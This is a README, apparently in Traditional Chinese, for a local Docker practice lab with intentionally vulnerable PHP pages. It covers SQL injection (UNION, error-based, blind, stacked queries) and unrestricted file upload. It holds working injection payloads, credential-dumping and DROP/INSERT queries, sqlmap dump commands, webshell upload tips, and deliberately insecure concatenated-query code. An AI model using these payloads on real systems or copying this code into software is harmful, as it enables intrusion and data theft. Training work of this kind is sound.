# SQL Injection Lab

本地端 SQL Injection / 檔案上傳漏洞練習環境，以 Docker Compose 一鍵啟動。

> **警告：本 Lab 故意設計為有漏洞的環境，請勿部署至公開網路。**

---

## 目錄結構

```
sqli-lab/
├── Dockerfile              # PHP 7.4 + Apache + mysqli
├── docker-compose.yml      # 服務編排
├── init.sql                # 資料庫初始資料
└── web/
    ├── index.php           # 練習平台總覽
    ├── union.php           # UNION-based SQL Injection
    ├── login.php           # 登入繞過 / Error-Based / Boolean-Based
    ├── title.php           # Error-Based SQL Injection
    ├── stacked.php         # Stacked Queries（mysqli 限制示範）
    ├── multi.php           # Stacked Queries（multi_query 實際可執行）
    ├── upload.php          # 檔案上傳漏洞
    └── uploads/            # 上傳檔案存放目錄
```

---

## 環境需求

| 工具 | 版本 |
|------|------|
| Docker | 20.10+ |
| Docker Compose | v2+ |

---

## 安裝與啟動

### 從 zip 安裝（Kali Linux 建議方式）

```bash
mkdir ~/sqliTest
unzip sqli-lab-for-kali.zip -d ~/sqliTest
cd ~/sqliTest
docker-compose up -d
```

### 一般啟動

```bash
cd sqli-lab

# 第一次啟動（build image + 初始化資料庫）
docker compose up -d --build

# 之後啟動
docker compose up -d
```

### 存取網址

| 服務 | URL |
|------|-----|
| 練習平台 | http://localhost:5987 |
| phpMyAdmin | http://localhost:5988 |

phpMyAdmin 帳號：`sqli` / 密碼：`sqli123`

---

## 停止與重置

```bash
# 停止容器（保留資料）
docker compose down

# 完整重置（刪除資料庫 volume，下次啟動重跑 init.sql）
docker compose down -v
docker compose up -d --build
```

---

## 資料庫資訊

| 項目 | 值 |
|------|----|
| Host | `db`（容器內）/ `localhost:3306`（本機） |
| Database | `sqli_lab` |
| User | `sqli` |
| Password | `sqli123` |
| Root Password | `root` |

### 資料表

**`users`** — 使用者帳號（5 個欄位：id, username, password, email, role）

| id | username | password | email | role |
|----|----------|----------|-------|------|
| 1 | admin | 123456 | admin@example.com | admin |
| 2 | secret | password | sec@example.com | staff |
| 3 | backup | user1234 | backup@example.com | guest |

**`products`** — 商品（3 個欄位：id, name, description）

| id | name | description |
|----|------|-------------|
| 1 | 蘋果 | 健康水果 |
| 2 | 筆電 | 效能優良 |
| 3 | 可樂 | 含糖飲料 |

**`items`** — 新聞（4 個欄位：id, title, description, body）

| id | title | description | body |
|----|-------|-------------|------|
| 1 | 新聞一 | 簡介一 | 內文一... |
| 2 | 新聞二 | 簡介二 | 內文二... |
| 3 | 新聞三 | 簡介三 | 內文三... |

---

## 練習頁面說明

### `index.php` — 總覽

練習平台入口，列出所有可用頁面的連結。

---

### `login.php` — 登入繞過

**後端原始碼：**

```php
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
$result = $mysqli->query($query) or die($mysqli->error);
if ($result->num_rows === 1) {
    // 登入成功
}
```

**漏洞點：** `username` 與 `password` 欄位直接字串拼接，未做任何過濾

**測試 URL：** `http://localhost:5987/login.php`（POST 表單）

**常用 Payload（填入帳號欄位）：**

| Payload | 效果 |
|---------|------|
| `' OR 1=1 -- ` | 繞過帳密驗證（`--` 後必須有空格） |
| `' OR 1=1 LIMIT 1 -- ` | 避免多筆結果造成登入失敗 |
| `' OR 'a'='a -- ` | 邏輯恆真變化型 |
| `' OR 1=1#` | 使用 `#` 作為註解符號 |
| `' UNION SELECT 123,'admin','pass','TW','admin' -- ` | 偽造假帳號登入（需符合 5 欄位） |

> `--` 後要加空白，才是有效的 SQL 註解！

---

### `union.php` — UNION-based SQL Injection

**後端查詢：**

```sql
SELECT id, name, description FROM products WHERE id = '$id'
```

**漏洞點：** `?id=` 參數直接拼接，共 **3 個欄位**

**測試 URL：** `http://localhost:5987/union.php?id=1`

#### Step 1 — 確認欄位數（ORDER BY 法）

```
?id=1 ORDER BY 1--+    正常
?id=1 ORDER BY 2--+    正常
?id=1 ORDER BY 3--+    正常
?id=1 ORDER BY 4--+    報錯 → 確認共 3 個欄位
```

#### Step 2 — 找出可顯示的欄位位置

```
?id=0 UNION SELECT 1,2,3--+
```

> `id=0`（或 `-1`）讓原始查詢回傳空結果，UNION 的資料才會顯示。

#### Step 3 — 取得資料庫基本資訊

```
?id=0 UNION SELECT 1,database(),version()--+
?id=0 UNION SELECT 1,user(),@@hostname--+
?id=0 UNION SELECT 1,@@datadir,@@basedir--+
```

#### Step 4 — 列出所有資料表

```
?id=0 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
```

#### Step 5 — 列出指定資料表的欄位

```
?id=0 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--+
```

#### Step 6 — 傾倒帳密資料（Data Dump）

```
?id=0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR ' | '),3 FROM users--+
?id=0 UNION SELECT id,username,role FROM users--+
```

> 也可搭配 login.php 的 5 欄位查詢：
> ```
> -1' UNION SELECT 1,username,password,email,role FROM users --
> ```

#### Step 7 — 跨資料庫查詢

```
?id=0 UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--+
```

---

### `title.php` — Error-Based SQL Injection

**後端查詢：**

```sql
SELECT title FROM items WHERE id = '$id'
```

**漏洞點：** `?id=` 參數，SQL 錯誤訊息直接回顯給使用者

**測試 URL：** `http://localhost:5987/title.php?id=1`

**Payload — extractvalue 法（XPath 錯誤回顯）：**

```
?id=' and extractvalue(0x0a,concat(0x0a,(select database())))--+
?id=' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--+
?id=' and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_name='items' limit 0,1)))--+
```

**Payload — GROUP BY + RAND() 法（floor 錯誤回顯）：**

```
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x)a)--+
```

> 兩種方法都能把查詢結果塞進 MySQL 錯誤訊息中顯示，差異在於支援的 MySQL 版本與觸發方式。

---

### `stacked.php` — Stacked Queries（限制示範）

**用途：** 示範 `mysqli::query()` 不支援多語句的行為

輸入含有 `;` 的 Payload 會被偵測並顯示限制說明，不會真正執行第二個語句。

```
?id=1; DROP TABLE users --        不會執行
?id=1; SELECT user()--            不會執行
```

> PHP 的 `mysqli::query()` 預設只允許執行單一 SQL 語句，這是刻意的安全設計。

---

### `multi.php` — Stacked Queries（實際可執行）

**後端查詢：** 使用 `mysqli::multi_query()`，允許一次執行多個 SQL 語句

**測試 URL：** `http://localhost:5987/multi.php?id=1`

```
?id=1; SELECT user()--
?id=1; INSERT INTO users(id,username,password) VALUES(999,'hacker','p@ss')--
?id=1; DROP TABLE IF EXISTS temp_table--
```

> 實務上使用 `multi_query()` 是高風險設計，攻擊者可直接 INSERT / UPDATE / DROP 資料。

---

### `upload.php` — 檔案上傳漏洞

**漏洞點：** 無副檔名限制、無 MIME 驗證，直接儲存至 `uploads/` 並可直接存取

**測試 URL：** `http://localhost:5987/upload.php`

| 攻擊手法 | 說明 |
|---------|------|
| WebShell 上傳 | 上傳 `.php` 檔案後直接瀏覽執行 |
| 副檔名繞過 | 嘗試 `.php5`、`.phtml`、`.phar` 等 |
| MIME 偽造 | Content-Type 改為 `image/jpeg`，內容為 PHP |
| XSS via 檔名 | 檔名包含 `<script>` 標籤 |

上傳後直接存取：`http://localhost:5987/uploads/<filename>`

---

## SQLi 各類型測試語法整理

以下以通用漏洞情境說明，對應原查詢：

```sql
SELECT * FROM users WHERE id = '$input'
```

---

### 1. UNION-based SQL Injection

```sql
-1' UNION SELECT 1, username, password, email, role FROM users --
```

> 利用 `UNION` 合併其他資料表查詢結果，欄位數與資料型別必須與原始查詢相符。

---

### 2. Error-based SQL Injection

**extractvalue 法：**
```sql
1' AND extractvalue(0x0a, concat(0x0a, (SELECT user()))) --
```

**GROUP BY + RAND() 法：**
```sql
1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x)a) --
```

> 利用 MySQL 的特定函式製造語法錯誤，使查詢結果出現在錯誤訊息中。

---

### 3. Boolean-based Blind SQL Injection

```sql
1' AND 1=1 --    有資料回應（條件為真）
1' AND 1=2 --    無資料回應（條件為假）
```

**逐字推測資料庫名稱：**

```sql
1' AND SUBSTRING((SELECT database()),1,1)='s' --
1' AND SUBSTRING((SELECT database()),2,1)='q' --
1' AND SUBSTRING((SELECT database()),3,1)='l' --
```

> 根據頁面是否有資料回應來判斷條件真假，逐字元推測資料內容。無錯誤訊息時使用此方法。

---

### 4. Time-based Blind SQL Injection

```sql
1' AND IF(1=1, SLEEP(5), 0) --
```

**逐字推測資料庫名稱：**

```sql
1' AND IF(SUBSTRING((SELECT database()),1,1)='s', SLEEP(5), 0) --
1' AND IF(SUBSTRING((SELECT database()),2,1)='q', SLEEP(5), 0) --
```

> 條件為真時伺服器延遲回應，藉此推斷資料內容。適用於完全無回顯的盲注情境。

---

### 5. 列舉資料庫資訊

**目前資料庫名稱：**

```sql
1' UNION SELECT 1, database(), null, null, null --
```

**所有資料表：**

```sql
1' UNION SELECT 1, table_name, null, null, null
   FROM information_schema.tables
   WHERE table_schema = database() --
```

**`users` 表的欄位名稱：**

```sql
1' UNION SELECT 1, column_name, null, null, null
   FROM information_schema.columns
   WHERE table_name = 'users' --
```

---

### 6. Stacked Queries（多語句）

> MySQL + `mysqli::query()` 不支援 `;` 分隔的多語句，以下語法在 `stacked.php` 無效，在 `multi.php` 有效。

```sql
1'; DROP TABLE users --
1'; INSERT INTO users VALUES(999,'pwned','123','x@x.com','admin') --
```

---

## 建議搭配工具

| 工具 | 用途 |
|------|------|
| [sqlmap](https://sqlmap.org/) | 自動化 SQL 注入偵測與利用 |
| [Burp Suite](https://portswigger.net/burp) | 攔截與修改 HTTP Request |
| curl | 命令列快速測試 Payload |
| 瀏覽器開發者工具 | 觀察 Request / Response |

**sqlmap 常用指令：**

```bash
# 偵測注入點並列出所有資料庫
sqlmap -u "http://localhost:5987/union.php?id=1" --dbs

# 列出指定資料庫的所有資料表
sqlmap -u "http://localhost:5987/union.php?id=1" -D sqli_lab --tables

# 傾倒 users 資料表
sqlmap -u "http://localhost:5987/union.php?id=1" -D sqli_lab -T users --dump

# 測試 title.php（Error-based）
sqlmap -u "http://localhost:5987/title.php?id=1" --technique=E --dbs

# 測試 login.php 表單（POST）
sqlmap -u "http://localhost:5987/login.php" \
       --data="user=admin&pass=123" \
       --level=3 --risk=2
```

---

## 常見問題

**Q: 啟動後網頁連不上？**

資料庫初始化需要幾秒，稍等後重新整理。查看 log：
```bash
docker compose logs -f db
```

**Q: 想重置所有資料？**

```bash
docker compose down -v
docker compose up -d
```

**Q: 想直接進入資料庫操作？**

```bash
# 進入 MySQL 容器
docker exec -it sqli-db mysql -u sqli -psqli123 sqli_lab

# 或使用 phpMyAdmin：http://localhost:5988
# 帳號: sqli  密碼: sqli123
```

**Q: 想查看 PHP / Apache log？**

```bash
docker compose logs -f web
```
